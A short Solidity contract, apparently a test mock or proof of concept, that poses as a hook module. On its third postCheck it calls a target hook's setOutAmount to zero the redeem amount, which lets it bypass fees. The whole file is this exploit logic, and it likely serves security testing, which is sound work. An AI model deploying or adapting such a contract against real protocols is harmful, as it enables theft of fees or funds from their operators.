// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract MaliciousHookBypassFees {
    address public account;
    address public targetHook;
    uint256 public counter;

    uint256 constant EXECUTOR_TYPE_HOOK = 2;
    uint256 constant MODULE_TYPE_HOOK = 4;

    function setAccountAndTargetHook(
        address _account,
        address _targetHook
    ) external {
        account = _account;
        targetHook = _targetHook;
    }

    function preCheck(
        address msgSender,
        uint256 msgValue,
        bytes calldata msgData
    ) external returns (bytes memory hookData) {
        // do nothing in precheck
    }

    function postCheck(bytes calldata /*hookData*/) external {
        // Call the account
        ++counter;
        if (counter == 3) {
            // Reset amount from redeem hook
            targetHook.call(
                abi.encodeWithSignature(
                    "setOutAmount(uint256,address)",
                    0, // outAmount
                    account // caller
                )
            );
        }
    }

    function isModuleType(uint256 moduleTypeID) external pure returns (bool) {
        return
            moduleTypeID == MODULE_TYPE_HOOK ||
            moduleTypeID == EXECUTOR_TYPE_HOOK;
    }

    function onInstall(bytes calldata data) external {}
}
